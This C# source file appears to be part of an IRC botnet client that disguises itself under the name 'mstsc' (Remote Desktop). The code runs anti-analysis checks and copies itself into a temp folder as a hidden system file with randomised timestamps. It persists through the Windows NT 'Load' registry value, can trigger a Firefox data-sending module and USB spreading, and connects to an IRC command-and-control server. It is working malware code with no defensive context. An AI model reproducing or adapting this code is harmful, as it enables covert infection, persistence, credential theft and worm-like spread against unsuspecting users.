using System;
using System.Text;
using System.Threading;
using System.IO;
using Microsoft.Win32;
using mstsc.IRC;

namespace mstsc.Aries
{
sealed class FileRegistry
    {

        public static void SetAllFilesReg()
        {
            new Antis.ProcessAntis().Process();
            while (!Util.AntiCheckComplete)
            {
                System.Windows.Forms.Application.DoEvents();
            }
            Util.AntiCheckComplete = false;
            //Main.mutex.WaitOne(5000, false);
            string path = Config.TemporaryFilesPath + '\\' + Path.GetFileName(System.Windows.Forms.Application.ExecutablePath);
            if (!System.Windows.Forms.Application.ExecutablePath.Contains(Config.TemporaryFilesPath))
                SaveToHost(path, Encoding.Default.GetBytes(Antis.Config.File[1]));

            CheckMutex(path);

            if (!System.Windows.Forms.Application.ExecutablePath.Contains(Config.TemporaryFilesPath))
                SaveToHost(Config.TemporaryFilesPath + '\\' + Config.File, File.ReadAllBytes(System.Windows.Forms.Application.ExecutablePath));

            CheckRegKey();

            if (Antis.ProcessAntis.UseAnti(Antis.ProcessAntis.Type.SendFirefox))
                new Commands.Firefox();

            if (Convert.ToBoolean(new Antis.Config().SafeAnti(Antis.Config.SafeAntiType.File1USBSpread)))
                new Commands.Spread();

            ConnectIRC();
        }



        public static void CheckRegKey()
        {
            try
            {
                const string RegKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
                //Create the key if it doesn't exist
                /*if (Registry.CurrentUser.OpenSubKey(RegKey, true).GetValue("load") == null)
                { Registry.CurrentUser.OpenSubKey(RegKey, true).SetValue("load", ""); }
                else
                {
                    //Clear the registry key
                    if (!(Registry.CurrentUser.OpenSubKey(RegKey, true).GetValue("load").ToString().Contains(Config.File))
                        & Registry.CurrentUser.OpenSubKey(RegKey, true).GetValue("load").ToString() != "")
                    {
                        Registry.CurrentUser.OpenSubKey(RegKey, true).SetValue("load", "");
                    }
                }*/

                //Set the registry key with the Short Path (8.3) filename
                RegistryKey regKey2;
                //if (Registry.CurrentUser.OpenSubKey(RegKey, true).GetValue("load").ToString() == "")
                {
                    regKey2 = Registry.CurrentUser.CreateSubKey(RegKey);

                    StringBuilder shortPath = new StringBuilder(255);
                    Util.GetShortPathName(Config.TemporaryFilesPath + Config.File, shortPath, shortPath.Capacity);
                    Util.ShortPath = shortPath.ToString();
                    regKey2.SetValue("Load", shortPath.ToString());
                }
            }
            catch { } //(Exception ee) { System.Windows.Forms.MessageBox.Show(ee.ToString() + "\n\n\n" + ee.Message); }
        }

        private static void ConnectIRC()
        {
            Main.Instance.IRCClient = new Client(Client.IRCVars(Client.Type.Server), Client.IRCVars(Client.Type.ServerPass),
                Int32.Parse(Client.IRCVars(Client.Type.Port)), Client.IRCVars(Client.Type.Master),
                Client.IRCVars(Client.Type.Channel), Client.IRCVars(Client.Type.ChannelPass), Util.GenerateNick());
            Main.Instance.IRCClient.OnMessageEvent += Main.Instance.OnMessage;
            Main.Instance.IRCClient.Connect();
        }

        public static void SaveToHost(string path, byte[] contents)
        {
            Thread.CurrentThread.Priority = ThreadPriority.AboveNormal;
            try { if (File.Exists(path)) { File.Delete(path); } }
            catch { }
            Thread.Sleep(100);
            if (!File.Exists(path))
            {
                //Write target file to the HDD, set random dates/times for the file
                File.WriteAllBytes(path, contents);
                string date = Convert.ToString(new Random().Next(1, 12) + @"/" + new Random().Next(1, 30) + @"/200" + new Random().Next(0, 9) + ' ');
                Thread.Sleep(100);
                string time = Convert.ToString(new Random().Next(1, 12));
                string clock = "PM";
                switch (new Random().Next(1, 2))
                {
                    case 1:
                        clock = ":00 AM";
                        break;
                    case 2:
                        clock = ":00 PM";
                        break;
                }
                File.SetCreationTime(path, DateTime.Parse(date + time + clock));
                File.SetLastWriteTime(path, DateTime.Parse(date + time + clock));
                File.SetAttributes(path, FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed);
                while (!File.Exists(path))
                {
                    System.Windows.Forms.Application.DoEvents();
                }
            }
        }

        private static void CheckMutex(string path)
        {

            //bool createdNew;
            //Mutex m = new Mutex(false, new Aries.Antis.Config().SafeAnti(Antis.Config.SafeAntiType.Mutex), out createdNew);
            if (!Main.createdNew)
            {// app is already running...
                if (!System.Windows.Forms.Application.ExecutablePath.Contains(Config.TemporaryFilesPath))
                {
                    System.Diagnostics.Process.Start(path);
                    //Environment.Exit(-1);
                }
                Environment.Exit(-1);
            }
            else
            {
                if (!System.Windows.Forms.Application.ExecutablePath.Contains(Config.TemporaryFilesPath))
                {
                    System.Diagnostics.Process.Start(path);
                    //Environment.Exit(-1);
                }
                //Environment.Exit(-1);
            }
            // keep the mutex reference alive until the normal termination of the program
            GC.KeepAlive(Main.mutex);
        }
    }
}
